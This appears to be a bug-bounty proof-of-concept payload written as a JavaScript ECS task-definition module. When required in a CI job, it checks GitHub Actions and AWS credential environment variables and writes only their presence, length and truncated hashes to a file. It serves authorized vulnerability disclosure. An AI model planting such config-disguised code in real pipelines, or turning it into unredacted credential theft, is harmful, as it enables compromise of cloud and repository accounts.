const fs = require('fs');
const crypto = require('crypto');

function redactedProof(name) {
  const v = process.env[name];
  if (!v) return name + '=absent';
  const hash = crypto.createHash('sha256').update(v).digest('hex').slice(0, 12);
  return name + '=present len=' + v.length + ' sha256_12=' + hash;
}

// Do not print or exfiltrate the real secret values anywhere (redacted proof only,
// evidence for an authorized H1 report). This demonstrates the require()'d payload
// runs with the job's full process.env, i.e. it can reach whatever credential
// material a later step (configure-aws-credentials OIDC token, GITHUB_TOKEN, etc.)
// would have used, not just that arbitrary code ran.
const lines = [
  redactedProof('GITHUB_TOKEN'),
  redactedProof('ACTIONS_ID_TOKEN_REQUEST_TOKEN'),
  redactedProof('ACTIONS_ID_TOKEN_REQUEST_URL'),
  redactedProof('AWS_ACCESS_KEY_ID'),
  redactedProof('AWS_SECRET_ACCESS_KEY'),
  redactedProof('AWS_SESSION_TOKEN'),
];

fs.writeFileSync('SECRET_REACH_PROOF', lines.join('\n') + '\n');

module.exports = {
  family: 'sample',
  containerDefinitions: [{ name: 'web', image: 'old:1', essential: true }]
};
